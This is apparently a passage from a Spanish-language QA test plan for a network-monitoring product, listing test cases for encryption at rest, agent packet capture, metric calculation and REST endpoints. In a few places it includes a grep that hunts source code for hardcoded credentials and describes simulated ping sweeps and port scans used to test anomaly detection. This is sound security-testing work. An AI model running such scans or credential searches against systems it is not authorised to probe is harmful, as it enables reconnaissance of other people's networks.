
| Campo | Detalle |
|---|---|
| **ID** | DAT-001 |
| **Titulo** | Verificar cifrado de datos en reposo en el dispositivo movil |
| **Prioridad** | Alta |
| **RF Asociados** | RF-041, RF-042 |
| **Riesgo Asociado** | RS01 |
| **Pasos** | 1. Con sesion activa, explorar almacenamiento interno de la app. 2. Verificar que no hay archivos JSON/SQLite con inventario de dispositivos en cache. 3. Verificar que el token JWT esta en EncryptedSharedPreferences o Keystore. 4. Verificar que no hay screenshots automaticos del dashboard en la carpeta de cache. 5. Verificar que la app usa `FLAG_SECURE` para prevenir screenshots del OS. |
| **Resultado Esperado** | Cero datos sensibles en texto plano en almacenamiento local. Token cifrado por hardware. Sin screenshots del dashboard en cache. |
| **Criterio de Aceptacion** | Ningun dato de red, dispositivos o credenciales es legible sin descifrar desde el almacenamiento del dispositivo. |
| **Severidad si falla** | Alta - Toda la informacion de la red expuesta si se pierde el dispositivo |

---

### DAT-002: Borrado de datos al cerrar sesion

| Campo | Detalle |
|---|---|
| **ID** | DAT-002 |
| **Titulo** | Verificar limpieza completa de datos sensibles al logout |
| **Prioridad** | Alta |
| **RF Asociados** | RF-043 |
| **Riesgo Asociado** | RS01 |
| **Pasos** | 1. Iniciar sesion y navegar por dashboard, dispositivos, alertas. 2. Cerrar sesion. 3. Inspeccionar almacenamiento local: shared_prefs, databases, cache. 4. Verificar que no quedan tokens, datos de dispositivos ni metricas en cache. 5. Verificar que WebView cache (si aplica) esta limpio. 6. Intentar acceder a la app sin reconectarse → debe mostrar login. |
| **Resultado Esperado** | Post-logout: cero datos residuales en almacenamiento local. Cache limpio. Token eliminado. |
| **Criterio de Aceptacion** | Ningun dato persiste tras logout. La app requiere login completo para acceder nuevamente. |
| **Severidad si falla** | Alta - Datos de red accesibles en dispositivo despues de cerrar sesion |

---

### DAT-003: Cifrado TLS en todas las comunicaciones API

| Campo | Detalle |
|---|---|
| **ID** | DAT-003 |
| **Titulo** | Verificar que toda comunicacion App-API usa HTTPS/TLS 1.2+ |
| **Prioridad** | Alta |
| **RF Asociados** | RNF Seguridad |
| **Riesgo Asociado** | RS02 |
| **Pasos** | 1. Capturar trafico entre la app y la API con Wireshark. 2. Verificar que todos los flujos usan TLS (puerto 443, no 80). 3. Verificar version de TLS (>=1.2, preferiblemente 1.3). 4. Verificar cipher suites (sin RC4, DES, NULL). 5. Intentar enviar peticion HTTP (sin S) → verificar redirect o rechazo. 6. Verificar certificado SSL del servidor (CA confiable, no autofirmado en produccion). |
| **Resultado Esperado** | 100% del trafico sobre TLS 1.2+. Sin fallback a HTTP. Cipher suites modernas (AES-GCM). Certificado valido. |
| **Criterio de Aceptacion** | Ningun byte de comunicacion App-API viaja sin cifrar. TLS 1.2+ obligatorio. HTTP (puerto 80) redirige a HTTPS con 301 o rechaza con conexion cerrada. HSTS habilitado con max-age >= 1 ano. |
| **Severidad si falla** | Alta - Credenciales y datos de red interceptables |

---

### DAT-004: Proteccion de datos sensibles en respuestas de la API

| Campo | Detalle |
|---|---|
| **ID** | DAT-004 |
| **Titulo** | Verificar que la API no expone datos sensibles innecesarios |
| **Prioridad** | Media |
| **RF Asociados** | RF-032 a RF-040 |
| **Pasos** | 1. Llamar cada endpoint y revisar el body de respuesta. 2. Verificar que `GET /api/devices` no retorna password_hash del User. 3. Verificar que las respuestas de error no incluyen stack traces, queries SQL, o rutas del servidor. 4. Verificar que `GET /api/agents` no retorna informacion sensible de la infraestructura interna. 5. Verificar que los JWT en Session no se retornan en ninguna respuesta (excepto login). |
| **Resultado Esperado** | Las respuestas contienen unicamente los campos documentados en el contrato API. Sin datos internos expuestos. |
| **Criterio de Aceptacion** | Ningun endpoint retorna datos fuera de la especificacion del CSV de API. Sin stack traces en produccion. |
| **Severidad si falla** | Media - Fuga de informacion interna del sistema |

---

### DAT-005: Integridad de datos en transmision agente-colector

| Campo | Detalle |
|---|---|
| **ID** | DAT-005 |
| **Titulo** | Verificar integridad de datos PCAP durante transmision TCP |
| **Prioridad** | Media |
| **RF Asociados** | RF-002, RF-003 |
| **Riesgo Asociado** | RNF Fiabilidad |
| **Pasos** | 1. Capturar PCAP localmente en el agente (referencia). 2. Capturar el mismo trafico despues de recibirlo en el colector. 3. Comparar checksum SHA-256 de los datos sanitizados. 4. Verificar que `orig_len` se preserva correctamente (RF-002). 5. Verificar que no hay paquetes duplicados ni perdidos en condiciones normales. |
| **Resultado Esperado** | Los datos recibidos en el colector coinciden byte a byte con los enviados por el agente. `orig_len` preservado en 100% de paquetes. |
| **Criterio de Aceptacion** | 100% de integridad en condiciones normales de LAN. |
| **Severidad si falla** | Media - Metricas calculadas sobre datos corruptos |

---

### DAT-006: Cifrado de archivos PCAP en reposo

| Campo | Detalle |
|---|---|
| **ID** | DAT-006 |
| **Titulo** | Verificar que los archivos PCAP almacenados en disco estan cifrados o protegidos |
| **Prioridad** | Alta |
| **RF Asociados** | RF-013, RF-014 |
| **Riesgo Asociado** | V-04, OWASP A02 |
| **Pasos** | 1. Acceder al directorio de almacenamiento PCAP en el servidor. 2. Intentar abrir un archivo PCAP con Wireshark/tshark directamente. 3. Verificar si los archivos estan cifrados (AES-256) o si son PCAP legibles en texto plano. 4. Verificar permisos de archivo: solo el usuario del servicio debe tener acceso (chmod 600). 5. Verificar que archivos procesados se eliminan con borrado seguro (no solo unlink). |
| **Resultado Esperado** | Los archivos PCAP deben tener permisos restrictivos (600, propietario = servicio). Idealmente cifrados en reposo. No accesibles por otros usuarios del sistema. |
| **Criterio de Aceptacion** | Permisos 600 o mas restrictivos. Sin acceso desde otros procesos/usuarios. Borrado efectivo post-procesamiento. |
| **Severidad si falla** | Alta - Todo el trafico de red capturado expuesto si el servidor se compromete |

---

### DAT-007: Proteccion de credenciales de base de datos

| Campo | Detalle |
|---|---|
| **ID** | DAT-007 |
| **Titulo** | Verificar que las credenciales de PostgreSQL no estan hardcodeadas ni expuestas |
| **Prioridad** | Alta |
| **RF Asociados** | RNF Seguridad |
| **Riesgo Asociado** | V-06, OWASP A02 |
| **Pasos** | 1. Buscar en el codigo fuente: `grep -ri "password\|postgres\|db_url\|database_url" .`. 2. Verificar que las credenciales se cargan desde variables de entorno o secrets manager. 3. Verificar que el archivo `.env` esta en `.gitignore`. 4. Verificar que los logs del backend no imprimen connection strings. 5. Verificar que la conexion a PostgreSQL usa SSL/TLS. 6. Verificar que el usuario de BD tiene permisos minimos (no superuser). |
| **Resultado Esperado** | Credenciales cargadas exclusivamente desde variables de entorno. Sin hardcoding. Connection string no visible en logs. Conexion cifrada. |
| **Criterio de Aceptacion** | 0 credenciales en codigo fuente o archivos versionados. Conexion a BD sobre SSL. Usuario de BD sin privilegios de superuser. |
| **Severidad si falla** | Alta - Acceso directo a la base de datos con todos los datos del sistema |

---

## 11. Casos de Prueba Funcionales - Modulo Agente (AGT)

> **Prioridad: ALTA** | RF-001 a RF-010

### AGT-001: Captura de trafico en interfaz de red

| Campo | Detalle |
|---|---|
| **ID** | AGT-001 |
| **Titulo** | Verificar captura continua de paquetes en la interfaz del endpoint |
| **Prioridad** | Alta |
| **RF Asociados** | RF-001 |
| **Precondiciones** | Agente instalado con permisos de captura (modo promiscuo). |
| **Pasos** | 1. Iniciar el agente. 2. Generar trafico conocido (ping, HTTP request). 3. Verificar que el agente captura paquetes entrantes y salientes. 4. Verificar formato PCAP del buffer local. 5. Desconectar la interfaz de red → verificar manejo de error y reintento. |
| **Resultado Esperado** | El agente captura 100% de los paquetes de la interfaz. Ante desconexion, registra error y reintenta periodicamente. |
| **Criterio de Aceptacion** | Captura verificada contra Wireshark corriendo en paralelo. Flujo alternativo de RF-001 funcional. |

---

### AGT-002: Sanitizacion de paquetes con slicing dinamico

| Campo | Detalle |
|---|---|
| **ID** | AGT-002 |
| **Titulo** | Verificar recorte dinamico de payload preservando orig_len |
| **Prioridad** | Alta |
| **RF Asociados** | RF-002 |
| **Pasos** | 1. Capturar paquete HTTP con payload de 1500 bytes. 2. Verificar que el agente aplica regla de slicing segun puerto de destino. 3. Verificar que `orig_len` preserva el valor 1500. 4. Capturar paquete menor al umbral → verificar que se transmite sin modificacion. 5. Verificar que headers completos (Ethernet + IP + TCP) se preservan siempre. |
| **Resultado Esperado** | Payload recortado segun reglas. `orig_len` siempre preservado. Headers intactos. Paquetes menores al umbral sin modificar. |
| **Criterio de Aceptacion** | RNF Fiabilidad: sanitizacion preserva siempre `orig_len` y headers completos. |

---

### AGT-003: Transmision TCP persistente al colector

| Campo | Detalle |
|---|---|
| **ID** | AGT-003 |
| **Titulo** | Verificar conexion TCP persistente y reconexion automatica |
| **Prioridad** | Alta |
| **RF Asociados** | RF-003, RNF Fiabilidad |
| **Pasos** | 1. Iniciar agente y verificar conexion TCP al colector. 2. Verificar transmision continua de datos sanitizados. 3. Matar el proceso del colector → verificar que el agente detecta la desconexion. 4. Reiniciar el colector → verificar reconexion automatica del agente en <60s. 5. Verificar que paquetes durante desconexion se descartan (no se acumulan indefinidamente en memoria). |
| **Resultado Esperado** | Conexion persistente estable. Reconexion en <60s (RNF). Paquetes descartados durante desconexion sin memory leak. |
| **Criterio de Aceptacion** | Reconexion en <60s verificada 5 veces consecutivas. Sin leaks de memoria. |

---

### AGT-004: Recoleccion y envio de metricas de sistema

| Campo | Detalle |
|---|---|
| **ID** | AGT-004 |
| **Titulo** | Verificar recoleccion de CPU, RAM y link speed cada 5 segundos |
| **Prioridad** | Alta |
| **RF Asociados** | RF-004, RF-005, RF-006, RF-007 |
| **Pasos** | 1. Iniciar agente y capturar paquetes UDP salientes. 2. Verificar envio cada 5 segundos con timestamp e identificador. 3. Comparar valor CPU reportado con `top`/Task Manager. 4. Comparar valor RAM reportado con `free`/Task Manager. 5. Verificar que link_speed corresponde a la interfaz real. 6. Simular fallo de lectura del sistema → verificar envio de valor nulo. |
| **Resultado Esperado** | Metricas enviadas cada 5s +/-500ms. Valores consistentes con el estado real del sistema (+/-5%). Valores nulos ante fallos de lectura. |
| **Criterio de Aceptacion** | Cadencia de 5s estable. CPU/RAM con precision del 5%. Formato de paquete UDP consistente. |

---

### AGT-005: Consumo de recursos del agente

| Campo | Detalle |
|---|---|
| **ID** | AGT-005 |
| **Titulo** | Verificar que el agente no consume mas de 5% CPU y 100MB RAM |
| **Prioridad** | Alta |
| **RF Asociados** | RNF Rendimiento |
| **Pasos** | 1. Iniciar agente en un endpoint con carga de trabajo normal. 2. Monitorear consumo de CPU del proceso del agente durante 30 minutos. 3. Monitorear consumo de RAM del proceso. 4. Generar trafico intenso (descarga de 1GB) y medir impacto. 5. Verificar que en ningun momento supera 5% CPU sostenido ni 100MB RAM. |
| **Resultado Esperado** | CPU <5% sostenido. RAM <100MB. Sin degradacion perceptible del rendimiento del endpoint. |
| **Criterio de Aceptacion** | En 30 minutos de operacion, el p95 de CPU <5% y max RAM <100MB. |

---

### AGT-006: Descubrimiento ARP de dispositivos

| Campo | Detalle |
|---|---|
| **ID** | AGT-006 |
| **Titulo** | Verificar escaneo ARP periodico y deteccion de dispositivos |
| **Prioridad** | Alta |
| **RF Asociados** | RF-008 |
| **Pasos** | 1. Conectar 5 dispositivos conocidos a la red. 2. Ejecutar ciclo de descubrimiento ARP del agente. 3. Verificar que los 5 dispositivos aparecen con IP y MAC correctas. 4. Desconectar 1 dispositivo → verificar que desaparece en el siguiente ciclo. 5. Conectar 1 dispositivo nuevo → verificar deteccion. 6. Verificar que el escaneo ARP no genera flooding (RT03). |
| **Resultado Esperado** | Deteccion del 100% de dispositivos activos. IP y MAC correctas. Deteccion de cambios en <2 ciclos de escaneo. |
| **Criterio de Aceptacion** | Inventario ARP consistente con la realidad de la red. Sin flooding. |

---

### AGT-007: Autoregistro y heartbeat

| Campo | Detalle |
|---|---|
| **ID** | AGT-007 |
| **Titulo** | Verificar autoregistro en primera ejecucion y heartbeat periodico |
| **Prioridad** | Alta |
| **RF Asociados** | RF-009, RF-010 |
| **Pasos** | 1. Ejecutar agente por primera vez → verificar envio de handshake. 2. Verificar que el colector responde con confirmacion. 3. Verificar registro en BD (tabla AGENT con uid, status, registered_at). 4. Verificar envio periodico de heartbeat. 5. Re-ejecutar agente ya registrado → verificar actualizacion de timestamp (no duplicado). 6. Verificar que uid es unico y no colisiona entre agentes. |
| **Resultado Esperado** | Registro exitoso en primera ejecucion. Heartbeat regular. Sin duplicados al re-registrar. UID unico por agente. |
| **Criterio de Aceptacion** | Flujos basico y alternativo de RF-009 y RF-010 verificados. |

---

### AGT-008: Compatibilidad multiplataforma del agente

| Campo | Detalle |
|---|---|
| **ID** | AGT-008 |
| **Titulo** | Verificar funcionamiento en Windows 10/11 y Linux Debian/Ubuntu |
| **Prioridad** | Media |
| **RF Asociados** | RNF Portabilidad |
| **Pasos** | 1. Instalar y ejecutar agente en Windows 10. 2. Verificar captura, sanitizacion, transmision TCP/UDP, ARP scan. 3. Repetir en Windows 11. 4. Repetir en Ubuntu 22.04 LTS. 5. Repetir en Debian 12. 6. Verificar que el archivo de configuracion externo (IP colector, puertos, intervalos) funciona en todas las plataformas. |
| **Resultado Esperado** | Funcionalidad identica en las 4 plataformas. Configuracion externa operativa. |
| **Criterio de Aceptacion** | Todos los tests AGT-001 a AGT-007 pasan en Windows 10, Windows 11, Ubuntu 22.04 y Debian 12. |

---

### AGT-009: Reglas de slicing por puerto de destino

| Campo | Detalle |
|---|---|
| **ID** | AGT-009 |
| **Titulo** | Verificar que las reglas de slicing se aplican correctamente segun el puerto de destino |
| **Prioridad** | Alta |
| **RF Asociados** | RF-002 |
| **Pasos** | 1. Configurar reglas de slicing diferenciadas: HTTP (80) → 128 bytes, HTTPS (443) → 64 bytes, DNS (53) → sin recorte, otros → 256 bytes. 2. Generar trafico a cada puerto. 3. Capturar el trafico sanitizado en el colector. 4. Verificar que cada tipo de trafico tiene el recorte correspondiente. 5. Verificar que un puerto no configurado usa la regla por defecto. 6. Modificar reglas en el archivo de configuracion → verificar que el agente las aplica sin reinicio (hot reload) o tras reinicio. |
| **Resultado Esperado** | Cada puerto aplica la regla de slicing configurada. Puertos no configurados usan default. Headers siempre preservados. |
| **Criterio de Aceptacion** | 100% de coherencia entre reglas configuradas y slicing aplicado. |

---

### AGT-010: Deteccion correcta de link speed por tipo de interfaz

| Campo | Detalle |
|---|---|
| **ID** | AGT-010 |
| **Titulo** | Verificar lectura de link speed en distintos tipos de interfaz de red |
| **Prioridad** | Media |
| **RF Asociados** | RF-007 |
| **Pasos** | 1. Ejecutar agente en endpoint con Ethernet 1Gbps → verificar reporte de 1000 Mbps. 2. Ejecutar en endpoint con WiFi → verificar reporte de velocidad de enlace WiFi. 3. Ejecutar en endpoint con interfaz USB → verificar manejo. 4. Desconectar interfaz → verificar reporte de 0 o null con indicador de error. 5. Cambiar de WiFi a Ethernet (dual NIC) → verificar que reporta la interfaz configurada. |
| **Resultado Esperado** | Link speed correcto para cada tipo de interfaz. Valor null o 0 ante interfaz desconectada. Sin crash ante cambios de interfaz. |
| **Criterio de Aceptacion** | Precision del 100% en link speed para interfaces Ethernet. WiFi reporta velocidad de enlace negociada. |

---

## 12. Casos de Prueba Funcionales - Modulo Backend/Motor (BKD)

> **Prioridad: ALTA** | RF-011 a RF-029

### BKD-001: Recepcion y almacenamiento de trafico PCAP

| Campo | Detalle |
|---|---|
| **ID** | BKD-001 |
| **Titulo** | Verificar recepcion simultanea TCP y escritura en buffer PCAP |
| **Prioridad** | Alta |
| **RF Asociados** | RF-011, RF-013 |
| **Pasos** | 1. Conectar 3 agentes transmitiendo simultaneamente. 2. Verificar que el colector acepta las 3 conexiones TCP. 3. Verificar escritura continua en `buffer_actual.pcap`. 4. Desconectar 1 agente → verificar que los otros 2 continuan sin interrupcion. 5. Verificar integridad del archivo PCAP resultante con tshark. |
| **Resultado Esperado** | Recepcion simultanea exitosa. Buffer PCAP valido. Desconexion de un agente no afecta a los demas. |

---

### BKD-002: Rotacion de archivos PCAP

| Campo | Detalle |
|---|---|
| **ID** | BKD-002 |
| **Titulo** | Verificar rotacion por tiempo (1 min) y por tamano (100MB) |
| **Prioridad** | Alta |
| **RF Asociados** | RF-014 |
| **Pasos** | 1. Con trafico activo, esperar 60 segundos → verificar rotacion por tiempo. 2. Verificar nombre del archivo rotado: `lote_YYYYMMDD_HHMMSS.pcap`. 3. Verificar creacion inmediata de nuevo `buffer_actual.pcap`. 4. Generar trafico suficiente para alcanzar 100MB antes de 60s → verificar rotacion por tamano. 5. Verificar que no hay perdida de paquetes durante la rotacion. |
| **Resultado Esperado** | Rotacion puntual por ambos criterios. Sin perdida de datos durante el cambio. Nomenclatura correcta. |

---

### BKD-003: Procesamiento y condensacion de datos

| Campo | Detalle |
|---|---|
| **ID** | BKD-003 |
| **Titulo** | Verificar pipeline completo: PCAP → analisis → condensacion → persistencia |
| **Prioridad** | Alta |
| **RF Asociados** | RF-016, RF-017, RF-018 |
| **Pasos** | 1. Generar un lote PCAP con trafico conocido (protocolos TCP, UDP, DNS, ICMP). 2. Verificar que el motor detecta el archivo rotado y lo procesa. 3. Verificar que los outputs de herramientas de analisis se generan correctamente. 4. Verificar condensacion: correlacion de trafico con dispositivos del inventario. 5. Verificar insercion en BD: tablas ENDPOINT_SNAPSHOT, NETWORK_SNAPSHOT. 6. Verificar que la transaccion es atomica (RNF Fiabilidad). |
| **Resultado Esperado** | Pipeline completo ejecutado. Datos correlacionados correctamente. Inserciones transaccionales en BD. |

---

### BKD-004: Calculo de metricas de red (caso paraguas)

| Campo | Detalle |
|---|---|
| **ID** | BKD-004 |
| **Titulo** | Verificar calculo de todas las metricas: BW, top talkers, ISP health, packet loss, retransmisiones TCP, DNS RT, jitter |
| **Prioridad** | Alta |
| **RF Asociados** | RF-020 a RF-027 |
| **Nota** | Este caso se descompone en BKD-009 a BKD-016 para validacion individual de cada metrica. |
| **Criterio de Aceptacion** | Todos los subcasos BKD-009 a BKD-016 deben pasar. Metricas con desviacion <10% respecto a herramientas de referencia. |

---

### BKD-005: Inventario dinamico de activos

| Campo | Detalle |
|---|---|
| **ID** | BKD-005 |
| **Titulo** | Verificar construccion y actualizacion del inventario unificado |
| **Prioridad** | Alta |
| **RF Asociados** | RF-028 |
| **Pasos** | 1. Registrar 3 agentes y descubrir 2 dispositivos adicionales por ARP. 2. Verificar inventario: 3 "con agente" + 2 "sin agente" = 5 total. 3. Instalar agente en uno de los 2 dispositivos sin agente → verificar reclasificacion. 4. Desconectar un dispositivo por multiples ciclos → verificar estado "desconectado". 5. Reconectar → verificar retorno a "activo". 6. Verificar deteccion de dispositivo nuevo (no autorizado) y generacion de alerta. |
| **Resultado Esperado** | Inventario refleja estado real de la red. Clasificacion correcta con/sin agente. Deteccion de dispositivos nuevos. |

---

### BKD-006: Deteccion de patrones sospechosos

| Campo | Detalle |
|---|---|
| **ID** | BKD-006 |
| **Titulo** | Verificar deteccion de anomalias basicas: ping sweep, port scan, new device |
| **Prioridad** | Alta |
| **RF Asociados** | RF-029 |
| **Riesgo Asociado** | RG01 (alcance MVP limitado a 3 tipos) |
| **Pasos** | 1. Simular ping sweep: enviar ICMP echo a todo el rango 192.168.1.1-254 desde un endpoint. 2. Verificar generacion de alerta tipo "Ping Sweep". 3. Simular port scan: enviar SYN a puertos 1-1024 de un host. 4. Verificar generacion de alerta tipo "Port Scan". 5. Conectar dispositivo nuevo desconocido a la red. 6. Verificar generacion de alerta tipo "New Device". 7. Verificar que cada alerta tiene: endpoint, tipo, descripcion, severidad, timestamp. |
| **Resultado Esperado** | 3 tipos de anomalia detectados correctamente. Alertas generadas y persistidas en BD. |

---

### BKD-007: Limpieza de PCAP procesados

| Campo | Detalle |
|---|---|
| **ID** | BKD-007 |
| **Titulo** | Verificar eliminacion de archivos PCAP tras procesamiento exitoso |
| **Prioridad** | Media |
| **RF Asociados** | RF-019 |
| **Pasos** | 1. Generar y rotar 10 archivos PCAP. 2. Verificar que tras procesamiento exitoso, cada archivo se elimina. 3. Simular fallo de procesamiento en 1 archivo → verificar que NO se elimina. 4. Verificar espacio en disco estable tras 1 hora de operacion. |
| **Resultado Esperado** | PCAPs exitosos eliminados. PCAPs con error retenidos para diagnostico. Disco estable. |

---

### BKD-008: Envio de notificaciones push

| Campo | Detalle |
|---|---|
| **ID** | BKD-008 |
| **Titulo** | Verificar envio de push al generar alerta y agrupacion de notificaciones |
| **Prioridad** | Alta |
| **RF Asociados** | RF-039, RC02 |
| **Pasos** | 1. Generar alerta de severidad critica → verificar push enviado inmediatamente. 2. Generar alerta de severidad baja → verificar comportamiento (puede agruparse). 3. Generar 5 alertas del mismo tipo en 1 minuto → verificar agrupacion (no 5 push separados). 4. Sin dispositivo registrado → verificar que la alerta queda solo en BD. 5. Con push token invalido → verificar manejo de error y reintento. |
| **Resultado Esperado** | Push inmediato para criticas. Agrupacion para repetitivas. Manejo graceful de errores de token. |

---

### BKD-009: Calculo de ancho de banda usando orig_len

| Campo | Detalle |
|---|---|
| **ID** | BKD-009 |
| **RF** | RF-020 |
| **Pasos** | 1. Generar trafico controlado de volumen conocido (ej. transferencia de 100MB). 2. Verificar que el motor calcula BW usando `orig_len` (no el tamano recortado). 3. Comparar con medicion de Wireshark corriendo en paralelo. 4. Verificar BW de entrada y salida por separado. |
| **Criterio de Aceptacion** | Desviacion <10% respecto a Wireshark. BW calculado con orig_len, no con tamano post-slicing. |

---

### BKD-010: Ranking de top talkers

| Campo | Detalle |
|---|---|
| **ID** | BKD-010 |
| **RF** | RF-021 |
| **Pasos** | 1. Generar trafico diferenciado: Dispositivo A = 50MB, B = 30MB, C = 10MB. 2. Verificar ranking: A > B > C. 3. Verificar que `is_hog` se marca para consumo desproporcionado. 4. Verificar persistencia en tabla TOP_TALKER. |
| **Criterio de Aceptacion** | Ranking correcto. `is_hog` activado cuando consumo > 2x promedio. |

---

### BKD-011: ISP health via ping a 8.8.8.8

| Campo | Detalle |
|---|---|
| **ID** | BKD-011 |
| **RF** | RF-022 |
| **Pasos** | 1. Verificar que el motor ejecuta ping a 8.8.8.8 periodicamente. 2. Medir latencia reportada vs ping manual. 3. Simular perdida de conectividad a internet → verificar estado "degraded/down". 4. Restaurar conectividad → verificar recuperacion. |
| **Criterio de Aceptacion** | Latencia reportada con desviacion <20ms vs ping manual. Estado correcto ante perdida de conectividad. |

---

### BKD-012: Packet loss global con umbral de 1%

| Campo | Detalle |
|---|---|
| **ID** | BKD-012 |
| **RF** | RF-023 |
| **Pasos** | 1. Generar trafico con `tc netem loss 0.5%` → no debe generar alerta. 2. Incrementar a `tc netem loss 2%` → debe generar alerta. 3. Verificar calculo: (paquetes perdidos / paquetes totales) * 100. 4. Verificar persistencia en NETWORK_SNAPSHOT. |
| **Criterio de Aceptacion** | Alerta disparada cuando packet_loss > 1%. Sin falsos positivos por debajo del umbral. |

---

### BKD-013: Retransmisiones TCP por endpoint

| Campo | Detalle |
|---|---|
| **ID** | BKD-013 |
| **RF** | RF-024 |
| **Pasos** | 1. Generar trafico TCP con retransmisiones simuladas (`tc netem duplicate 5%`). 2. Verificar que el motor cuenta retransmisiones por endpoint. 3. Comparar con conteo de Wireshark (`tcp.analysis.retransmission`). 4. Verificar persistencia en ENDPOINT_SNAPSHOT. |
| **Criterio de Aceptacion** | Conteo con desviacion <10% vs Wireshark. Atribucion correcta por endpoint. |

---

### BKD-014: Conexiones fallidas por endpoint

| Campo | Detalle |
|---|---|
| **ID** | BKD-014 |
| **RF** | RF-025 |
| **Pasos** | 1. Generar conexiones TCP exitosas y fallidas (SYN sin SYN-ACK, RST). 2. Verificar conteo de fallidas vs exitosas por endpoint. 3. Verificar que conexiones rechazadas (RST) se cuentan como fallidas. 4. Verificar persistencia en ENDPOINT_SNAPSHOT.failed_connections. |
| **Criterio de Aceptacion** | 100% de conexiones fallidas detectadas. Sin falsos positivos (RST legitimos despues de FIN). |

---

### BKD-015: DNS response time con umbral de 100ms

| Campo | Detalle |
|---|---|
| **ID** | BKD-015 |
| **RF** | RF-026 |
| **Pasos** | 1. Generar queries DNS con respuesta normal (<50ms). 2. Simular DNS lento con `tc netem delay 150ms` en puerto 53. 3. Verificar que el motor calcula RT promedio correctamente. 4. Verificar alerta cuando RT > 100ms. 5. Comparar con medicion de `dig` o `nslookup`. |
| **Criterio de Aceptacion** | DNS RT con desviacion <15ms vs herramientas de referencia. Alerta activa cuando promedio > 100ms. |

---

### BKD-016: Calculo de jitter

| Campo | Detalle |
|---|---|
| **ID** | BKD-016 |
| **RF** | RF-027 |
| **Pasos** | 1. Generar trafico UDP con variacion de latencia conocida. 2. Verificar que el motor calcula jitter como variacion inter-packet delay. 3. Comparar con calculo manual sobre captura Wireshark. 4. Verificar persistencia en NETWORK_SNAPSHOT. |
| **Criterio de Aceptacion** | Jitter calculado con desviacion <15% vs calculo manual. |

---

### BKD-017: Alerta de disco lleno por acumulacion de PCAP

| Campo | Detalle |
|---|---|
| **ID** | BKD-017 |
| **Titulo** | Verificar generacion de alerta cuando el espacio en disco supera umbral critico |
| **Prioridad** | Alta |
| **RF Asociados** | RF-019, RNF Fiabilidad |
| **Pasos** | 1. Configurar umbral de alerta de disco al 80% y critico al 90%. 2. Llenar disco hasta 80% → verificar alerta de warning. 3. Llenar hasta 90% → verificar alerta critica. 4. Verificar que la alerta incluye: espacio disponible, espacio usado, numero de PCAPs pendientes. 5. Verificar envio de push notification para alerta critica. |
| **Resultado Esperado** | Alertas generadas en ambos umbrales. Informacion de diagnostico incluida. Push enviado para nivel critico. |

---

### BKD-018: Cola de procesamiento cuando la BD no esta disponible

| Campo | Detalle |
|---|---|
| **ID** | BKD-018 |
| **Titulo** | Verificar comportamiento del motor cuando PostgreSQL no responde |
| **Prioridad** | Alta |
| **RF Asociados** | RF-018, RNF Fiabilidad |
| **Pasos** | 1. Con el motor procesando PCAPs normalmente, detener PostgreSQL. 2. Verificar que el motor detecta el fallo de conexion a BD. 3. Verificar que los PCAPs procesados no se eliminan (retiene para reintento). 4. Verificar que el motor no crashea sino que entra en modo de espera. 5. Reiniciar PostgreSQL → verificar que el motor retoma el procesamiento. 6. Verificar que los datos pendientes se insertan correctamente sin duplicados. |
| **Resultado Esperado** | Motor resiliente ante caida de BD. PCAPs retenidos para reintento. Recuperacion automatica sin duplicados. |

---

## 13. Casos de Prueba Funcionales - API REST (API)

> **Prioridad: ALTA** | Validacion contra contrato apigg.csv

### API-001: POST /api/auth/login

| Campo | Detalle |
|---|---|
| **ID** | API-001 |
| **RF** | RF-030 |
| **Metodo/Ruta** | `POST /api/auth/login` |
| **Casos** | 1. Credenciales validas → 200 + `{token, expires_at}`. 2. Password incorrecta → 401 "Credenciales invalidas". 3. Usuario inexistente → 401 (mismo mensaje, sin enumeracion). 4. Campos faltantes → 400. 5. Body vacio → 400. 6. Content-Type incorrecto → 400/415. |
| **Validaciones** | Token es JWT valido. `expires_at` es ISO 8601 futuro. Se crea registro en tabla Session. |

---

### API-002: POST /api/auth/logout

| Campo | Detalle |
|---|---|
| **ID** | API-002 |
| **RF** | RF-043 |
| **Metodo/Ruta** | `POST /api/auth/logout` |
| **Casos** | 1. Con token valido → 200 "Sesion cerrada exitosamente". 2. Sin token → 401. 3. Con token ya revocado → 401. 4. Verificar que Session se marca como revocada. 5. Verificar que PushToken asociado se elimina. |

---

### API-003: GET /api/devices

| Campo | Detalle |
|---|---|
| **ID** | API-003 |
| **RF** | RF-032 |
| **Metodo/Ruta** | `GET /api/devices` |
| **Casos** | 1. Sin filtros → retorna lista completa. 2. `?status=active` → solo activos. 3. `?has_agent=true` → solo con agente. 4. `?search=hostname_parcial` → busqueda funcional. 5. Sin dispositivos → lista vacia `[]`. 6. Verificar campos: id, ip, mac, hostname, alias, device_type, has_agent, status, cpu_pct, ram_pct, last_seen. 7. Dispositivos sin agente → cpu_pct y ram_pct null. |

---

### API-004: GET /api/devices/{id}

| Campo | Detalle |
|---|---|
| **ID** | API-004 |
| **RF** | RF-033 |
| **Metodo/Ruta** | `GET /api/devices/{id}` |
| **Casos** | 1. ID existente → 200 con detalle completo. 2. ID inexistente → 404. 3. ID no numerico → 400/404. 4. Verificar que `agent` es null si no tiene agente. 5. Verificar que `latest_metrics` contiene EndpointSnapshot mas reciente. |

---

### API-005: PUT /api/devices/{id}/alias

| Campo | Detalle |
|---|---|
| **ID** | API-005 |
| **RF** | RF-038 |
| **Metodo/Ruta** | `PUT /api/devices/{id}/alias` |
| **Casos** | 1. Alias valido (string, max 64 chars) → 200 + id, alias, updated_at. 2. Alias vacio → 400. 3. Alias >64 chars → 400. 4. ID inexistente → 404. 5. Alias con caracteres especiales → segun politica de validacion. 6. Verificar que no afecta hostname ni detected_type. |

---

### API-006: GET /api/devices/{id}/metrics

| Campo | Detalle |
|---|---|
| **ID** | API-006 |
| **RF** | RF-035 |
| **Metodo/Ruta** | `GET /api/devices/{id}/metrics` |
| **Casos** | 1. Dispositivo con agente → todas las metricas presentes. 2. Dispositivo sin agente → cpu_pct, ram_pct, link_speed null. 3. ID inexistente → 404. 4. Verificar campos: bandwidth_in/out, tcp_retransmissions, failed_connections, dns_response_time, jitter, cpu_pct, ram_pct, link_speed. |

---

### API-007: GET /api/devices/{id}/metrics/history

| Campo | Detalle |
|---|---|
| **ID** | API-007 |
| **RF** | RF-040 |
| **Metodo/Ruta** | `GET /api/devices/{id}/metrics/history` |
| **Casos** | 1. Rango valido → array de snapshots. 2. Sin params from/to → 400. 3. Rango invalido (from > to) → 400. 4. Rango sin datos → `[]`. 5. `?resolution=1h` → datos agregados. 6. Resolution invalida → 400. 7. Respuesta <5s (RNF rendimiento). |

---

### API-008: GET /api/network/metrics

| Campo | Detalle |
|---|---|
| **ID** | API-008 |
| **RF** | RF-034 |
| **Metodo/Ruta** | `GET /api/network/metrics` |
